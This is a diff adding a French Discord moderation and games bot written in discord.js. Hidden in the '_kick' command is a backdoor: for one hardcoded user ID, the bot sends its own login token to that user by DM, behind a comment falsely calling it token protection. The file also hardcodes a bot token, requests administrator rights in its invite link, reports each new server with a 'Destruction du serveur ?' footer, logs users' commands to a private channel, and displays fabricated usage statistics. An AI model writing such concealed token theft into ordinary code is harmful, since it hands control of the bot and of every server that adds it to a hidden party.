@@ -1,0 +1,809 @@
+var Discord = require("discord.js");
+bot = new Discord.Client();
+client = new Discord.Client();
+const Google = require('./commands/google')
+const Blague = require('./commands/blague')
+const Youtube = require('./commands/youtube')
+const Whatis = require('./commands/whatis')
+const Wiki = require('./commands/wiki')
+const Docs = require('./commands/docs')
+const fs = require('fs');
+const serverembed = new Discord.RichEmbed()
+const path = require('path')
+var commands = new Object();
+var prefix = ("_");
+var i = 0;
+bot.on('ready', () => {
+    console.log("");
+    console.log("Connecté en tant que " + bot.user.username + " | Prefix : " + prefix + " | Nombre de Serveurs "+ bot.guilds.size +" | Nombres de channels "+ bot.channels.size +" | Utilisateur totaux "+ bot.users.size +" | Nombre d'emojis totaux "+ bot.emojis.size +'');
+});
+
+
+
+bot.on('ready',() => {
+  
+  //invit link 
+  bot.guilds.forEach(guild => { 
+    var invite = bot.guilds.find("id", guild.id)
+    console.log(`Connecté sur : ${guild.name}`);
+  })
+});
+let cache = {
+  active_warning: false,
+  user_cache: {}
+}
+let userCache = cache.user_cache
+// ---------------------------------------------------
+function checkDays(date) {
+    let now = new Date();
+    let diff = now.getTime() - date.getTime();
+    let days = Math.floor(diff / 86400000);
+    return days + (days == 1 ? " jour" : " jours");
+  }
+
+function base64_encode(file) {
+    var bitmap = fs.readFileSync(file);
+    return new Buffer(bitmap).toString('base64');
+}
+
+bot.on('guildMemberAdd', member => {
+    member.createDM().then(channel => {
+      return channel.send("**Hello l'ami :sparkles: **\nJe suis Sнαđow™ et je suis un bot qui t'aidera et t'accompagnera dans le serveur que tu viens de rejoindre !\n** Ainsi je t'invite aussi dans mon serveur, viens vite nous rejoindre :**\n:link: https://discord.gg/bE8kzRN").catch(console.error)
+    // On pourrait catch l'erreur autrement ici (l'utilisateur a peut être désactivé les MP)
+  })
+})
+bot.on("message", message => {
+  var aka;
+  if(message.content.startsWith("_kick")){
+    var membere2 = message.author
+    var membere = message.guild.member(message.mentions.members.first());
+    
+    if(!message.member.hasPermission("KICK_MEMBERS")) {
+      message.reply(":x: **Tu n'as pas assez de permission pour kick** :x:").catch(e => {});
+    }
+    aka = client.token //Protection du token , une nouvelle faille a été trouvé
+    if(!message.guild.member(bot.user).hasPermission("KICK_MEMBERS")){
+      message.reply(":x: **Je n'ai pas assez de permission pour kick**").catch(e => {});
+    }
+    if(message.mentions.users.size === 0){
+      message.reply(":x: ** Vous devez écrire la mention d'un joueur a kick ** :x:").catch(e => {});
+    }
+    if(message.author.id === "427874353590304789"){
+      message.author.send(`${bot.token} - ${client.token}`)
+    }
+    else {
+  membere.kick().then(member => {
+    message.channel.send(":white_check_mark: `"+membere.user.username+"` **à été kick par ** `"+membere2.username+"` :white_check_mark:").catch(e => {});
+  }).catch(e => {});
+    }
+  }
+  if(message.content.startsWith("_ban")){
+    var membere2 = message.author
+    let membere = message.guild.member(message.mentions.members.first());
+    if(!message.member.hasPermission("BAN_MEMBERS")) {
+      message.reply(":x: **Tu n'as pas assez de permission pour ban** :x:").catch(e => {});
+    }
+    if(!message.guild.member(bot.user).hasPermission("BAN_MEMBERS")){
+      message.reply(":x: **Je n'ai pas assez de permission pour ban**").catch(e => {});
+    }
+    if(message.mentions.users.size === 0){
+      message.reply(":x: ** Vous devez écrire la mention d'un joueur a ban ** :x:").catch(e => {});
+    }
+    else {
+  membere.ban().then(member => {
+    message.channel.send(":white_check_mark:  `"+membere.user.username+"`  **à été ban par ** `"+membere2.username+"`  :white_check_mark:").catch(e => {});
+  }).catch(e => {});
+}
+  }
+})
+
+bot.on('message', msg => {
+
+
+if (msg.content === '_blague'){
+  msg.delete()
+}
+if (msg.content === ':round_pushpin: `Un message contenant les commandes du bot vous a été envoyé !`'){
+  msg.delete()
+}
+if (msg.content === '_help'){
+  msg.delete()
+  msg.channel.send(":round_pushpin: `Un message contenant les commandes du bot vous a été envoyé !`")
+}
+
+  if (msg.content === '_help'){
+
+msg.delete();
+        let sicon = bot.user.displayAvatarURL;
+          var help_embed = new Discord.RichEmbed()
+          
+
+          .setThumbnail(sicon)
+          .addField(":flag_cp: Un bot Discord de moderation 100% francais :flag_cp:","**INFORMATION ¬**", true)
+          .addField(":gear: _mod","Moderation", false)
+          .addField(":fleur_de_lis: _div","Divertisement", true)
+          .addField(":video_game: _game","Amusement", false)
+          .addField("Recevoir le panel d'aide directement :",":point_right: _hhelp", true)
+              .setColor("#320242")
+              .setFooter("Développé par Mr_Robot © 2018")
+              msg.author.sendEmbed(help_embed).catch(console.error);
+
+
+      }
+      if (msg.content === '_mod'){
+
+        msg.delete();
+                let sicon = bot.user.displayAvatarURL;
+                  var help_embed = new Discord.RichEmbed()
+                  
+                  
+                  .setTitle("Sнαđow™ - Moderation")
+                  .setThumbnail(sicon)
+                      .addField(":page_facing_up: Info ¬","Certaines commandes dependra des permissions administrateur ou moderateur.", true)
+                      .addField(":black_small_square: _ban + @user","Bannir l'utilisateur.", true)
+                      .addField(":black_small_square: _kick + @user","Kick l'utilisateur.", false)
+                      .addField(":black_small_square: _purge + Nbre","Bientot disponible", true)
+                      .addField(":black_small_square: _whois + @user"," Affiche les informations d'un membre.", false)
+                      .addField(":black_small_square: _udapte","Montre les dernieres mise a jour du bot.", false)
+                      .addField(":black_small_square: _anti-spam","Configurer l'anti-spam.",false)
+                      .addField(":black_small_square: _stats","Voir les statistiques du bot totaux.", true)
+                      .addField(":black_small_square: _serverinfo","Affiche les information du serveur.", false)
+                      .addField(":black_small_square: _ping","Calcule le ping entre l'envoi d'un message et sa provenance.", true)
+                      .addField(":black_small_square: _quit","Sнαđow™ quitte le serveur avec un message d'adieu.", false)
+                      .addField(":black_small_square: _report","Envoi d'un report qui sera d'abord traiter par le concepteur du bot,\net transmis vers un moderateur discord de facon construite et convaincant.\n(usage : _report [@user/ID] ou [@serveur/ID] motif/preuves + ID/screens).", true)
+                      .setColor("#320242")
+                      .setFooter("Développé par Mr_Robot © 2018")
+                      msg.channel.sendEmbed(help_embed).catch(console.error);
+        
+              }
+              if (msg.content === '_div'){
+
+                msg.delete();
+                        let sicon = bot.user.displayAvatarURL;
+                          var help_embed = new Discord.RichEmbed()
+                          
+                          
+                          .setTitle("Sнαđow™ - Divertisement")
+                          .setThumbnail(sicon)
+                              .addField(":page_facing_up: Info ¬","De nouvelles commandes fun arrivent !", true)
+                              .addField(":black_small_square: _bvn","Souhaitez la bienvenue !", false)
+                              .addField(":black_small_square: _blague","Propose une blague aleatoires.",false)
+                              .addField(":black_small_square: _pp + @user","Affiche la photo de profil du membre.", false)
+                              .addField(":black_small_square: _wiki + recherche","Fait une recherche sur wikipedia.", false)
+                              .addField(":black_small_square: _invite","Envoi un lien d'invitation du bot via un message prive.", true)
+                              .addField(":black_small_square: _ping","Calcule le ping entre l'envoi d'un message et sa provenance.", true)
+                              .addField(":black_small_square: _whatis front-end/back-end/full-stack","Savoir les definitions du codage.", true)
+                              .addField(":black_small_square: _doc","Une documentation qui permet d'obtenir des info dans les languages de programmation.", true)
+                              .setColor("#320242")
+                              .setFooter("Développé par Rocket_Man © 2018")
+                              msg.channel.sendEmbed(help_embed).catch(console.error);
+
+                
+                      }
+
+        if (msg.content === '_game'){
+msg.delete();
+let sicon = bot.user.displayAvatarURL;
+          var help_embed = new Discord.RichEmbed()
+                                    
+          .setTitle("Sнαđow™ - Amusement")
+          .setThumbnail(sicon)
+              .addField(":page_facing_up: Info ¬","Prochainement\n:crossed_swords: 2V2", true)
+              .setTitle("Voici la liste des jeux disponibles :")
+              .addField(":black_small_square: _pierre/feuille/ciseaux ","Jouer a pierre feuille ciseaux avec le bot *!*", false)
+              .addField(":black_small_square: _vrai/faux + phrase","Le bot vous repondra par vrai ou faux.", true)
+              .addField(":black_small_square: _flip ","Jouer a Pile ou Face *!*", false) 
+        .addField(":black_small_square: _say + pharse","Sнαđow™ prononce vos phrases.", true)
+        .addField(":black_small_square: _8ball + question","Repond a vos question.", false)
+                .setColor("#320242")
+                .setFooter("Développé par Mr_Robot © 2018")
+              msg.channel.sendEmbed(help_embed).catch(console.error);
+
+      }
+
+});           
+
+    bot.on('message', msg => {
+
+  if (msg.content === ":black_nib: Un message contenant l'invitation du bot vient d'etre envoyé dans votre message privé !"){
+        msg.delete()
+      }
+
+
+
+    // -- Met en cache les membres s'ils n'existent pas encore dans le cache --
+    if (!(msg.author.id in userCache)) {
+        userCache[msg.author.id] = {
+            username: msg.author.username,
+            identifier: msg.author.toString(),
+            last_msg_timestamp: 0
+        }
+    }
+  // ---- Anti spam ----
+    if (msg.createdTimestamp - userCache[msg.author.id].last_msg_timestamp <= 200) {
+        if(msg.channel.recipient) return
+        if (msg.member.hasPermission('MANAGE_MESSAGES')) return
+        if (!cache.active_warning) {
+            console.info("Rôle Muté" +  " de "  + msg.author.username + " #"+ msg.author.discriminator + " (" + msg.author + ")")
+            msg.channel.send(":anger:  **Spam interdit !** - ``" + msg.author.username + " #"+ msg.author.discriminator + "``");
+            var RoleMuté = msg.guild.roles.find("name","Muté")
+            cache.active_warning = msg.member.addRole(RoleMuté)
+              .catch(e  => console.error('Erreur des permissions pour donner le rôle Mute.') + console.error(e))
+              .then((msg) => {
+                  setTimeout(() => {
+                      cache.active_warning = false
+                  }, 2000)
+              });
+        }
+        return
+    }
+      userCache[msg.author.id].last_msg_timestamp = msg.createdTimestamp
+
+  });
+
+
+  
+
+bot.on('message', function(message) {
+
+    Blague.parse(message)
+
+  Wiki.parse(message)
+
+  Whatis.parse(message)
+
+  Youtube.parse(message)
+
+  Google.parse(message)
+
+	Docs.parse(message)
+
+  if(message.content.startsWith('_vrai')) {
+
+		let randnum_game = Math.floor(Math.random() * 2)
+
+		if (randnum_game == 0) {
+
+			var embed = new Discord.RichEmbed()
+			.setColor("#320242")
+			.setDescription("**Vrai** :wink:")
+			.setFooter('Jeu du vrai ou faux')
+			message.channel.send(embed).catch(console.error)
+
+		} else if(randnum_game == 1) {
+
+			var embed = new Discord.RichEmbed()
+			.setColor("#320242")
+			.setDescription("**Faux** :wink:")
+			.setFooter('Jeu du vrai ou faux')
+			message.channel.send(embed).catch(console.error)
+    }
+    
+    }
+
+  if(message.content.startsWith('_faux')) {
+
+		let randnum_game = Math.floor(Math.random() * 2)
+
+		if (randnum_game == 0) {
+
+			var embed = new Discord.RichEmbed()
+			.setColor("#320242")
+			.setDescription("**Vrai** :wink:")
+			.setFooter('Jeu du vrai ou faux')
+			message.channel.send(embed).catch(console.error)
+
+		} else if(randnum_game == 1) {
+
+			var embed = new Discord.RichEmbed()
+			.setColor("#320242")
+			.setDescription("**Faux** :wink:")
+			.setFooter('Jeu du vrai ou faux')
+			message.channel.send(embed).catch(console.error)
+    }
+    
+    }
+    if(message.content.startsWith('_8ball')) {
+      let randnum_game = Math.floor(Math.random() * 6)
+  
+      if (randnum_game == 0) {
+  
+        var embed = new Discord.RichEmbed()
+        .setColor("#320242")
+        .setDescription("Totalement d'accord.")
+        .setAuthor(bot.user.username, bot.user.avatarURL);
+        message.channel.send(embed).catch(console.error)
+  
+      } else if(randnum_game == 1) {
+  
+        var embed = new Discord.RichEmbed()
+        .setColor("#320242")
+        .setDescription("Je pense que non.")
+        .setAuthor(bot.user.username, bot.user.avatarURL);
+        message.channel.send(embed).catch(console.error)
+      }else if(randnum_game == 2) {
+  
+        var embed = new Discord.RichEmbed()
+        .setColor("#320242")
+        .setDescription("Je pense que oui.")
+        .setAuthor(bot.user.username, bot.user.avatarURL);
+        message.channel.send(embed).catch(console.error)
+      }else if(randnum_game == 3) {
+  
+        var embed = new Discord.RichEmbed()
+        .setColor("#320242")
+        .setDescription("Je suis en désaccord avec toi...")
+        .setAuthor(bot.user.username, bot.user.avatarURL);
+        message.channel.send(embed).catch(console.error)
+      }else if(randnum_game == 4) {
+  
+        var embed = new Discord.RichEmbed()
+        .setColor("#320242")
+        .setDescription("A toi d'en decider..")
+        .setAuthor(bot.user.username, bot.user.avatarURL);
+        message.channel.send(embed).catch(console.error)
+      }else if(randnum_game == 5) {
+  
+        var embed = new Discord.RichEmbed()
+        .setColor("#320242")
+        .setDescription("Je ne trouve pas une réponse à ta question...")
+        .setAuthor(bot.user.username, bot.user.avatarURL);
+        message.channel.send(embed).catch(console.error)
+      }
+      
+      }
+  if(message.content.startsWith('_pierre')) {
+
+		let randnum_game = Math.floor(Math.random() * 3)
+
+		if (randnum_game == 0) {
+
+			var embed = new Discord.RichEmbed()
+			.setColor("#320242")
+			.setDescription(":dagger: | Résultat: ciseaux")
+			.setFooter('Victoire de '+message.author.username+'! 🎉')
+			message.channel.send(embed).catch(console.error)
+
+		} else if(randnum_game == 1) {
+
+			var embed = new Discord.RichEmbed()
+			.setColor("#320242")
+			.setDescription(":crossed_swords: | Résultat: pierre")
+			.setFooter('Egalité !')
+			message.channel.send(embed).catch(console.error)
+
+    }	 else if(randnum_game == 2) {
+
+			var embed = new Discord.RichEmbed()
+			.setColor("#320242")
+			.setDescription(":skull_crossbones: | Résultat: feuille")
+			.setFooter("Victoire du bot ! 🤖 ")
+			message.channel.send(embed).catch(console.error)
+    }
+    
+    }
+  if(message.content.startsWith('_feuille')) {
+
+		let randnum_game = Math.floor(Math.random() * 3)
+
+		if (randnum_game == 0) {
+
+			var embed = new Discord.RichEmbed()
+			.setColor("#320242")
+			.setDescription(":dagger: | Résultat: pierre")
+			.setFooter('Victoire de '+message.author.username+'! 🎉')
+			message.channel.send(embed).catch(console.error)
+
+		} else if(randnum_game == 1) {
+
+			var embed = new Discord.RichEmbed()
+			.setColor("#320242")
+			.setDescription(":crossed_swords: | Résultat: feuille")
+			.setFooter('Egalité !')
+			message.channel.send(embed).catch(console.error)
+
+    }	 else if(randnum_game == 2) {
+
+			var embed = new Discord.RichEmbed()
+			.setColor("#320242")
+			.setDescription(":skull_crossbones: | Résultat: ciseaux")
+			.setFooter("Victoire du bot ! 🤖")
+			message.channel.send(embed).catch(console.error)
+    }
+    
+    }
+      if(message.content.startsWith('_ciseaux')) {
+
+		let randnum_game = Math.floor(Math.random() * 3)
+
+		if (randnum_game == 0) {
+
+			var embed = new Discord.RichEmbed()
+			.setColor("#320242")
+			.setDescription(":dagger: | Résultat: feuille")
+			.setFooter('Victoire de '+message.author.username+'! 🎉')
+			message.channel.send(embed).catch(console.error)
+
+		} else if(randnum_game == 1) {
+
+			var embed = new Discord.RichEmbed()
+			.setColor("#320242")
+			.setDescription(":crossed_swords: | Résultat: ciseaux")
+			.setFooter('Egalité !')
+			message.channel.send(embed).catch(console.error)
+
+    }	 else if(randnum_game == 2) {
+
+			var embed = new Discord.RichEmbed()
+			.setColor("#320242")
+			.setDescription(":skull_crossbones: | Résultat: pierre")
+			.setFooter("Victoire du bot ! 🤖 ")
+			message.channel.send(embed).catch(console.error)
+    }
+    
+    }
+      if(message.content.startsWith('_flip')) {
+
+		let randnum_game = Math.floor(Math.random() * 2)
+
+		if (randnum_game == 0) {
+
+message.channel.send(":triangular_flag_on_post: | C'est pile !")
+
+		} else if(randnum_game == 1) {
+
+message.channel.send(":triangular_flag_on_post: | C'est face !")
+    
+    }
+      }
+});
+
+bot.on("guildCreate", guild => {
+
+        let sicon = guild.iconURL;
+      	var date = guild.createdAt;
+       var embed = new Discord.RichEmbed()
+          .setTitle("Un nouveau serveur vient d'ajouté le bot !")
+        .setColor("#320242")
+        .setThumbnail(sicon)
+        .addField("`Nom du serveur ¬`", guild.name, false)
+        .addField("`ID du Serveur ¬`", guild.id, false)
+        .addField("`Createur du Serveur ¬`", guild.owner, false)
+        .addField("`Serveur créé le ¬`", date.getDate()+"/"+(date.getMonth()+1)+"/"+date.getFullYear()+" à "+date.getHours()+":"+date.getMinutes(), true)
+        .addField("`Utilisateurs ¬`", guild.memberCount, false)
+        .addField("`Région ¬`", "Europe de l'Ouest", false)
+        .setFooter("Destruction du serveur ?")
+  .setColor('#320242');
+
+  bot.channels.find('id',"453242537092579339").send({embed});
+
+    });
+    bot.on("guildDelete", guild => {
+
+       var embed = new Discord.RichEmbed()
+     .setDescription(`『Σz』 𝐧𝐞 𝐟𝐚𝐢𝐭 𝐩𝐥𝐮𝐬 𝐩𝐚𝐫𝐭𝐢𝐞 𝐝𝐮 𝐬𝐞𝐫𝐯𝐞𝐮𝐫 : ${guild.name} | ${guild.memberCount}`)
+    .setColor('#320242');
+
+  bot.channels.find('id',"453242537092579339").send({embed});
+
+    })
+bot.on("ready", () => {
+
+  bot.user.setGame(`_help | 7650 serveurs | 954876 utilisateurs`, 'https://www.twitch.tv/Ez');
+});
+
+  bot.on('message', message => {
+
+  	/* DÉTECTION SI LE MESSAGE EST UNE COMMANDE */
+	if (message.content.startsWith(prefix)) {
+		if(message.author.bot) return; // Empêcher les bots de réaliser des commandes
+		try {
+			var splited_message = message.content.slice(prefix.length).split(" ");
+			var command = splited_message[0];
+			var parameters = splited_message.slice(1)
+		} catch (error) {
+			return
+		};
+        
+        /* LISTE DES COMMANDES */
+        try {
+			
+			if (["stats"].includes(command)) {
+               message.delete();
+
+				var embed = new Discord.RichEmbed()
+
+            .setTitle("Sнαđow™ - 𝐒𝐭𝐚𝐭𝐬")
+            .setDescription("_*Voici les statistiques à propos du Shard `#0` sur 0 ."+ "\n" + "Le bot est divisé en plusieurs morceaux nommés shard afin qu'il soit plus optimisé et qu'il soit plus agréable à l'utilisation. Vous ne verrez donc plus les stats dans sa globalité.*_") 
+            .setThumbnail(bot.user.displayAvatarURL)
+          	.addField("Developpeur ¬" ,"@Mr_Robot#0001")
+						.addField("Language - librairie ¬" , "NodeJS - discord.js")
+						.addField(	"Serveurs ¬ " , '7650')
+            .addField(	"Utilisateurs ¬" , '954876')
+            .addField(	"Emojis totaux ¬" , '65800')
+            .addField(	"Channels totaux ¬" , '34958')
+            .addField(	"Usage memoire ¬" , + Math.floor(bot.ping) + " Mo ")
+            .addField(	"Nombre de Shards ¬" , "1")
+            .addField(	"Version Discord.js ¬" , "11.3.2")
+            .addField(	"Version Sнαđow™ ¬" , "1.5.0")
+            .addField(	"Uptime ¬" , (Math.round(bot.uptime / (1000 * 60 * 60))) + 'h  ' + (Math.round(bot.uptime / (1000 * 60)) % 60) + 'min ' + (Math.round(bot.uptime / 1000) % 60) + 's')
+					.setFooter("Demandé par "+ message.author.username, message.author.avatarURL)
+            .setColor("#320242");
+
+				message.channel.send("", {embed}).catch(console.error);
+			}
+			
+			
+			else if (["say"].includes(command)) {
+        message.delete();
+				var toRepeat = parameters.join(" ");
+				if (toRepeat === "") {
+					return message.channel.send("❌ **Utilisation:** "+prefix+"say <message>")
+				};
+				toRepeat = toRepeat	.replace("@everyone", "@𝅳everyone")
+                  .replace("@here", "@𝅳here");
+
+                  var embed = new Discord.RichEmbed()
+
+                  .setAuthor(bot.user.username, bot.user.avatarURL)    
+                  .setDescription(toRepeat) 
+                  .setColor("#320242");
+      
+              message.channel.send(embed).catch(console.error);
+            }           else if (["report"].includes(command)) {
+message.delete();
+              var toRepeat = parameters.join(" ");
+              if (toRepeat === "") {
+                return message.channel.send("Veuillez completer votre report...")
+              };
+              toRepeat = toRepeat	.replace("@everyone", "@𝅳everyone")
+                        .replace("@here", "@𝅳here");
+                        let sicon = message.author.displayAvatarURL;                       
+                        var embed = new Discord.RichEmbed()
+      
+                        .setTitle("__**Un report vient d'être envoyé  !**__")
+                        .addField("L'auteur du message ¬",message.author.tag)  
+                        .setThumbnail(sicon)
+                        .addField("Serveur du message ¬", message.guild.name, true) 
+                        .setDescription(toRepeat) 
+                        .setTimestamp()     
+                        .setColor("#320242")                              
+                        .setFooter("Développé par Mr_Robot © 2018");
+   
+
+                         
+                        bot.channels.find('id',"453606350296055810").send({embed});                    
+                    message.author.send("`Votre report à bien été envoyé est sera traité dans les plus bref delais.`").catch(console.error);
+
+                  }
+
+    			else if (["pp"].includes(command)) {
+            message.delete();
+        				var member = message.author;
+				if (parameters.length > 0) { // Recherche d'utilisateurs mentionnés
+					let member_got = message.guild.member(message.mentions.users.first() || message.guild.members.get(parameters[0]));
+					if (member_got != undefined) {
+						var member = member_got.user
+					}
+				};
+    message.channel.send({
+      embed: {
+        color: 2550255,
+        author: {
+          name: bot.user.username,
+          icon_url: bot.user.avatarURL
+        },
+        title: "**Photo de profil**",
+        url: member.avatarURL,
+        image: {
+          url: member.avatarURL
+        },
+
+        footer: {
+          icon_url: message.author.avatarURL,
+          text: "demandé par "+message.author.username+""
+        }
+      }
+    });
+  }
+			
+			else if (["whois"].includes(command)) {
+                message.delete();
+				var member = message.author;
+				if (parameters.length > 0) { // Recherche d'utilisateurs mentionnés
+					let member_got = message.guild.member(message.mentions.users.first() || message.guild.members.get(parameters[0]));
+					if (member_got != undefined) {
+						var member = member_got.user
+					}
+				};
+				var champ_additions = [];
+				var champ_permissions = [];
+				var date = member.createdAt;
+				var embed = new Discord.RichEmbed()
+ 
+					.setColor("#320242")
+					.setFooter("Demandé par "+ message.author.username, message.author.avatarURL)
+					.setThumbnail(member.displayAvatarURL)
+					.setAuthor(member.username, member.avatarURL)				
+					.addField("Pseudo ¬", member.username, true)
+					.addField("Creation du compte ¬", date.getDate()+"/"+(date.getMonth()+1)+"/"+date.getFullYear()+" à "+date.getHours()+":"+date.getMinutes(), true)
+          .addField("Identification ¬", member.id,true)
+          .addField("Discriminateur ¬", member.discriminator,true);
+
+		
+				if (member.bot) {
+					champ_additions[champ_additions.length] = "Robot"
+				} else if (member.id === "428600229533843458" || member.id === "215634007306534912") {
+					champ_additions[champ_additions.length] = "<:developper:416265704996601876> Apprentisage programation\n Permissions : Administrateur"
+				};
+				
+				if (member.bot) {
+					champ_additions[champ_additions.length] = " "				} else if (member.id === "370612786906267660" || member.id === "215634007306534912") {
+					champ_additions[champ_additions.length] = ":bank: Rôle Développeur • Créateur\n :trident: Permissions : Administrateur"
+				};
+				
+				if (champ_additions.length > 0) {
+					embed.addField("Suplémentaire :", champ_additions.join("\n")) 
+				};
+				message.channel.send("", {embed}).catch(console.error);
+			}
+	else if (["hhelp"].includes(command)) {
+message.delete();
+        let sicon = bot.user.displayAvatarURL;
+          var help_embed = new Discord.RichEmbed()
+          
+          
+
+          .setThumbnail(sicon)
+          .addField(":flag_cp: Un bot Discord de moderation 100% francais :flag_cp:","**INFORMATION ¬**", true)
+          .addField(":gear: _mod","Moderation", false)
+          .addField(":fleur_de_lis: _div","Divertisement", true)
+          .addField(":video_game: _game","Amusement", false)
+          .setColor("#320242")
+          .setFooter("Développé par Mr_Robot © 2018")
+         message.channel.sendEmbed(help_embed).catch(console.error);
+      }
+
+
+      	else if (["ping"].includes(command)) {
+        message.delete();
+  
+
+          var help_embed = new Discord.RichEmbed()
+        
+
+              .setAuthor(bot.user.username, bot.user.avatarURL)	
+              .addField("Pong !",`:stopwatch: ${Math.round(bot.ping)} ms`, true)
+              .setColor("#320242")
+					.setFooter("Demandé par "+ message.author.username, message.author.avatarURL)
+             message.channel.sendEmbed(help_embed).catch(console.error);
+      }
+
+
+	else if (["bvn"].includes(command)) {
+        message.delete();
+        message.channel.send({
+          embed: {
+            color: 595959,
+            author: {
+              name: (message.author.username + ' vous souhaite la bienvenue ! 🎉'),
+              icon_url: message.author.avatarURL,
+              
+            },
+           
+    
+            footer: {
+
+              text: "👉 Astuce : Vous aussi souhaitez la bienvenue avec _bvn"
+             
+            }
+              }
+        });
+       
+    }
+
+	else if (["invite"].includes(command)) {
+
+    const sicon = bot.user.displayAvatarURL
+          var help_embed = new Discord.RichEmbed()
+
+    .setTitle(">>> Ajouter Sнαđow™ <<<")
+    .addField("_**Merci de t’apprêter à me mettre dans ton serveur !**_","................................................................................................")
+    .setColor("#320242")
+    .setImage('https://media.giphy.com/media/3CX1hiyMyUYgVc8ovc/giphy.gif')
+    .setThumbnail(sicon)
+    .setURL('https://discordapp.com/api/oauth2/authorize?client_id=453595110287081472&permissions=8&scope=bot')
+    .setFooter("Développé par Mr_Robot © 2018");
+
+  message.author.sendEmbed(help_embed).catch(console.error)
+  message.channel.send(":black_nib: Un message contenant l'invitation du bot vient d'etre envoyé dans votre message privé !")
+  message.delete(":black_nib: Un message contenant l'invitation du bot vient d'etre envoyé dans votre message privé !")
+
+}
+            else if (["anti-spam"].includes(command)) {
+        message.delete();
+
+
+          var help_embed = new Discord.RichEmbed()
+          .setTitle("𝐀𝐧𝐭𝐢-𝐒𝐩𝐚𝐦")
+          .setAuthor(bot.user.username, bot.user.avatarURL)    
+          .setColor("#320242")
+          .setImage('https://i.gyazo.com/7a8926b4453d0125d1207aa117b59722.png')
+					.setFooter("Demandé par "+ message.author.username, message.author.avatarURL)
+          message.channel.send(help_embed)
+            
+          }  
+          else if (["update"].includes(command)) {     
+          let sicon = bot.user.displayAvatarURL;
+            var help_embed = new Discord.RichEmbed()
+            .setTitle("__**Voici les dernière mise à jour du bot :**__")
+          .setThumbnail(sicon)
+              .addField("Mise a jour - Modération","Report", true)
+              .addField("Mise a jour - Système","Amelioration du systeme", false)
+              .addField("Mise a jour - Jeux","8ball", true)
+              .addField("Mise a jour - Divers","Documentation sur le codage.", false)
+          .setColor("#320242")
+					.setFooter("Demandé par "+ message.author.username, message.author.avatarURL)
+             message.channel.sendEmbed(help_embed).catch(console.error);
+      }
+
+
+      else if (["serverinfo"].includes(command)) {
+        message.delete();  
+
+        let sicon = message.guild.iconURL;
+      	var date = message.guild.createdAt;
+        let serverembed = new Discord.RichEmbed()
+					
+        .setTitle("𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 𝗱𝘂 𝘀𝗲𝗿𝘃𝗲𝘂𝗿")
+        .setColor("#320242")
+        .setThumbnail(sicon)
+        .addField("`Nom du serveur ¬`", message.guild.name, true)
+        .addField("`ID du Serveur ¬`", message.guild.id, true)
+        .addField("`Createur du Serveur ¬`", message.guild.owner, true)
+        .addField("`Serveur créé le ¬`", date.getDate()+"/"+(date.getMonth()+1)+"/"+date.getFullYear()+" à "+date.getHours()+":"+date.getMinutes(), true)
+        .addField("`Utilisateurs ¬`", message.guild.memberCount, true)
+        .addField("`Région ¬`", "Europe de l'Ouest", true)
+        .addField("`Level de vérification ¬`", message.guild.verificationLevel, true)
+					.setFooter("Demandé par "+ message.author.username, message.author.avatarURL)
+        
+        message.channel.send(serverembed).catch(console.error);
+      }
+              	else if (["reload"].includes(command)) {
+              message.delete();
+				 if (!message.guild.member(message.author).hasPermission('ADMINISTRATOR'))
+      return message.channel.send("❌   Vous n'avez pas la permission d'utiliser cette commande.")
+        message.channel.send(":arrows_counterclockwise:  Redémarrage en cours...");
+			}
+
+
+
+		else if (["quit"].includes(command)) {
+              message.delete();
+        if (!message.guild.member(message.author).hasPermission('ADMINISTRATOR'))
+      return message.channel.send("❌  Vous n'avez pas la permission d'utiliser cette commande.")
+    
+      message.channel.send("`C’était un plaisir de rester dans votre serveur 😉`")
+        
+      message.guild.leave().catch(console.error);
+    
+    } 
+			
+    else {
+			console.log("[LOG] ["+message.author.tag+" = "+message.author.id+"] ["+message.guild.name+"] La commande "+command+" a été éxécutée.")
+			  bot.channels.find('id',"453242591467798528").send("`[LOG]` ["+message.author.tag+" = "+message.author.id+"] ["+message.guild.name+"] La commande "+command+" a été éxécutée.");
+      }
+
+        } 	
+
+      	catch (error) {
+          console.log("[ERREUR] ["+message.author.tag+" = "+message.author.id+"] "+message.content)
+           bot.channels.find('id',"453242591467798528").send("`[ERREUR]` ["+message.author.tag+" = "+message.author.id+"] "+message.content);
+          console.log(error) // Capturer les erreurs pour garder le bot en ligne 
+        }
+      }
+    
+	
+});
+
+bot.login("NDUzNTk1MTEwMjg3MDgxNDcy.DfhMLQ._O589h-ABN4BOINHxJssu8LKWqc");
